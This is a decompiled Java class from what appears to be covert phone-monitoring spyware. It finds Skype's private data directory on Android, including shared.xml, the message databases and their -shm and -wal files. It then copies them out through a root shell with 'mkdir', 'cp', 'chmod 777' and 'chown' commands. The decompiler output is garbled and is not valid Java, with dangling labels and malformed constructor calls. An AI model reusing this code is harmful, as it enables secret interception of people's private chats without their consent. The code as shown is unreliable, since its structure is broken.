package com.vvt.capture.e.b.b;

import com.vvt.capture.e.g;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.Enumeration;
import java.util.Hashtable;

public class d
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  
  public static String a(String paramString)
  {
    return g.g(paramString);
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    String str = p.a(paramString1, "skype");
    return a(paramString1, paramString2, str, paramString3);
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    int i = b;
    if (i != 0) {}
    Object localObject2 = com.vvt.capture.e.d.a();
    boolean bool2 = false;
    Object localObject3 = null;
    int k = localObject2.length;
    i = 0;
    Object localObject4 = null;
    if (i < k)
    {
      String str = localObject2[i];
      boolean bool4 = ShellUtil.b(str);
      if (!bool4) {
        break label307;
      }
      localObject4 = b(paramString2, paramString3, paramString4);
      if (localObject4 != null)
      {
        localObject4 = com.vvt.capture.e.d.c((String)localObject4);
        boolean bool5 = b;
        if ((bool5) && (localObject4 == null)) {
          break label325;
        }
        localObject2 = "%s/files/%s";
        Object[] arrayOfObject = new Object[2];
        arrayOfObject[0] = str;
        bool1 = true;
        arrayOfObject[bool1] = localObject4;
        localObject1 = String.format((String)localObject2, arrayOfObject);
        bool5 = ShellUtil.b((String)localObject1);
        boolean bool3 = b;
        if ((bool3) && (!bool5)) {
          break label187;
        }
        localObject4 = localObject1;
      }
    }
    for (;;)
    {
      label160:
      localObject3 = localObject4;
      i = b;
      if (i != 0) {}
      i = b;
      if (i != 0) {}
      return (String)localObject3;
      label187:
      localObject1 = "live:";
      bool1 = ((String)localObject4).startsWith((String)localObject1);
      if (bool1)
      {
        localObject1 = "live:";
        localObject2 = "";
        localObject4 = ((String)localObject4).replace((CharSequence)localObject1, (CharSequence)localObject2);
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append("/data/data/com.skype.raider/files");
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "live#3a";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject4 = (String)localObject4;
      bool1 = ShellUtil.b((String)localObject4);
      if (bool1) {}
      for (;;)
      {
        bool2 = b;
        if (!bool2) {
          break label160;
        }
        break label160;
        label307:
        i += 1;
        break;
        j = 0;
        localObject4 = null;
      }
      label325:
      int j = 0;
      localObject4 = null;
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    Object localObject1 = p.a(paramString1, paramString3);
    String str1 = p.a(paramString2, paramString3);
    Object localObject3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
    int i = 5;
    try
    {
      Object localObject4 = new Object[i];
      int j = 0;
      Object localObject5 = null;
      localObject4[0] = paramString2;
      j = 1;
      localObject4[j] = paramString2;
      j = 2;
      localObject4[j] = paramString5;
      j = 3;
      localObject4[j] = paramString5;
      j = 4;
      localObject4[j] = paramString2;
      localObject3 = String.format((String)localObject3, (Object[])localObject4);
      KMShell.a((String)localObject3);
      bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(paramString2);
      }
      localObject4 = new java/util/Hashtable;
      ((Hashtable)localObject4).<init>();
      ((Hashtable)localObject4).put(localObject1, str1);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject5 = "-shm";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append(str1);
      String str2 = "-shm";
      localObject5 = ((StringBuilder)localObject5).append(str2);
      localObject5 = ((StringBuilder)localObject5).toString();
      ((Hashtable)localObject4).put(localObject3, localObject5);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = "-wal";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append(str1);
      localObject5 = "-wal";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      ((Hashtable)localObject4).put(localObject1, localObject3);
      localObject5 = ((Hashtable)localObject4).keys();
      for (;;)
      {
        boolean bool2 = ((Enumeration)localObject5).hasMoreElements();
        if (!bool2) {
          break;
        }
        localObject1 = ((Enumeration)localObject5).nextElement();
        localObject1 = (String)localObject1;
        localObject3 = ((Hashtable)localObject4).get(localObject1);
        localObject3 = (String)localObject3;
        str2 = "%s cp %s %s; chmod 777 %s; chown %s.%s %s";
        int m = 7;
        Object[] arrayOfObject = new Object[m];
        int n = 0;
        arrayOfObject[0] = paramString4;
        n = 1;
        arrayOfObject[n] = localObject1;
        int k = 2;
        arrayOfObject[k] = localObject3;
        k = 3;
        arrayOfObject[k] = localObject3;
        k = 4;
        arrayOfObject[k] = paramString5;
        k = 5;
        arrayOfObject[k] = paramString5;
        k = 6;
        arrayOfObject[k] = localObject3;
        localObject1 = String.format(str2, arrayOfObject);
        KMShell.a((String)localObject1);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject3);
        }
        bool3 = b;
        if (!bool3) {}
      }
      localObject1 = str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1;
        boolean bool3 = a;
        if (bool3) {}
        bool3 = false;
        Object localObject2 = null;
      }
    }
    bool1 = b;
    if (bool1) {}
    return (String)localObject1;
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6)
  {
    Object localObject1 = p.a(paramString1, paramString2);
    String str1 = p.a(paramString3, paramString4);
    Object localObject3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
    int i = 5;
    try
    {
      Object localObject4 = new Object[i];
      int j = 0;
      Object localObject5 = null;
      localObject4[0] = paramString3;
      j = 1;
      localObject4[j] = paramString3;
      j = 2;
      localObject4[j] = paramString6;
      j = 3;
      localObject4[j] = paramString6;
      j = 4;
      localObject4[j] = paramString3;
      localObject3 = String.format((String)localObject3, (Object[])localObject4);
      KMShell.a((String)localObject3);
      bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(paramString3);
      }
      localObject4 = new java/util/Hashtable;
      ((Hashtable)localObject4).<init>();
      ((Hashtable)localObject4).put(localObject1, str1);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject5 = "-shm";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append(str1);
      String str2 = "-shm";
      localObject5 = ((StringBuilder)localObject5).append(str2);
      localObject5 = ((StringBuilder)localObject5).toString();
      ((Hashtable)localObject4).put(localObject3, localObject5);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = "-wal";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append(str1);
      localObject5 = "-wal";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      ((Hashtable)localObject4).put(localObject1, localObject3);
      localObject5 = ((Hashtable)localObject4).keys();
      for (;;)
      {
        boolean bool2 = ((Enumeration)localObject5).hasMoreElements();
        if (!bool2) {
          break;
        }
        localObject1 = ((Enumeration)localObject5).nextElement();
        localObject1 = (String)localObject1;
        localObject3 = ((Hashtable)localObject4).get(localObject1);
        localObject3 = (String)localObject3;
        str2 = "%s cp %s %s; chmod 777 %s; chown %s.%s %s";
        int m = 7;
        Object[] arrayOfObject = new Object[m];
        int n = 0;
        String str3 = a(paramString5);
        arrayOfObject[0] = str3;
        n = 1;
        arrayOfObject[n] = localObject1;
        int k = 2;
        arrayOfObject[k] = localObject3;
        k = 3;
        arrayOfObject[k] = localObject3;
        k = 4;
        arrayOfObject[k] = paramString6;
        k = 5;
        arrayOfObject[k] = paramString6;
        k = 6;
        arrayOfObject[k] = localObject3;
        localObject1 = String.format(str2, arrayOfObject);
        KMShell.a((String)localObject1);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject3);
        }
        bool3 = b;
        if (!bool3) {}
      }
      localObject1 = str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1;
        boolean bool3 = a;
        if (bool3) {}
        bool3 = false;
        Object localObject2 = null;
      }
    }
    bool1 = b;
    if (bool1) {}
    return (String)localObject1;
  }
  
  public static String b(String paramString1, String paramString2, String paramString3)
  {
    Object localObject1 = null;
    int i = 2;
    int j = 1;
    int k = 0;
    Object[] arrayOfObject = null;
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data/com.skype.raider/files";
    String str1 = "shared.xml";
    localObject2[j] = str1;
    String str2 = String.format("%s/%s", (Object[])localObject2);
    boolean bool1 = ShellUtil.b(str2);
    if (bool1) {}
    for (;;)
    {
      bool1 = com.vvt.ag.b.a(str2);
      if (!bool1)
      {
        localObject2 = p.a(paramString2, "shared.xml");
        str1 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        k = 5;
      }
      try
      {
        arrayOfObject = new Object[k];
        j = 0;
        arrayOfObject[0] = paramString2;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        arrayOfObject[j] = paramString3;
        j = 4;
        arrayOfObject[j] = paramString2;
        str1 = String.format(str1, arrayOfObject);
        KMShell.a(str1);
        boolean bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k(paramString2);
        }
        str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        k = 7;
        arrayOfObject = new Object[k];
        j = 0;
        arrayOfObject[0] = paramString1;
        j = 1;
        arrayOfObject[j] = str2;
        int m = 2;
        arrayOfObject[m] = localObject2;
        m = 3;
        arrayOfObject[m] = localObject2;
        m = 4;
        arrayOfObject[m] = paramString3;
        m = 5;
        arrayOfObject[m] = paramString3;
        m = 6;
        arrayOfObject[m] = localObject2;
        str2 = String.format(str1, arrayOfObject);
        KMShell.a(str2);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject2);
        }
        localObject1 = localObject2;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          boolean bool3 = a;
          if (!bool3) {}
        }
      }
      return (String)localObject1;
      localObject2 = new Object[i];
      localObject2[0] = "/dbdata/files/com.skype.raider/files";
      str1 = "shared.xml";
      localObject2[j] = str1;
      str2 = String.format("%s/%s", (Object[])localObject2);
      bool1 = ShellUtil.b(str2);
      if (!bool1)
      {
        bool3 = false;
        str2 = null;
      }
    }
  }
  
  public static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    boolean bool1 = false;
    String str1 = null;
    int i = b;
    if (i != 0) {}
    Object localObject1 = com.vvt.capture.e.d.a();
    Object localObject2 = null;
    int k = localObject1.length;
    i = 0;
    String str2 = null;
    if (i < k)
    {
      String str3 = localObject1[i];
      boolean bool2 = ShellUtil.b(str3);
      if (!bool2) {
        break label175;
      }
      str2 = b(paramString2, paramString3, paramString4);
      if (str2 != null)
      {
        str2 = com.vvt.capture.e.d.c(str2);
        if (str2 == null) {
          break label184;
        }
        str2 = com.vvt.n.a.e.b.c(str2);
        localObject1 = "%s/%s";
        int m = 2;
        Object[] arrayOfObject = new Object[m];
        arrayOfObject[0] = str2;
        i = 1;
        str1 = "asyncdb";
        arrayOfObject[i] = str1;
        str2 = String.format((String)localObject1, arrayOfObject);
        bool1 = ShellUtil.b(str2);
        if (!bool1) {
          break label184;
        }
      }
    }
    for (;;)
    {
      localObject2 = str2;
      i = b;
      if (i != 0) {}
      i = b;
      if (i != 0) {}
      return (String)localObject2;
      label175:
      i += 1;
      break;
      label184:
      int j = 0;
      str2 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */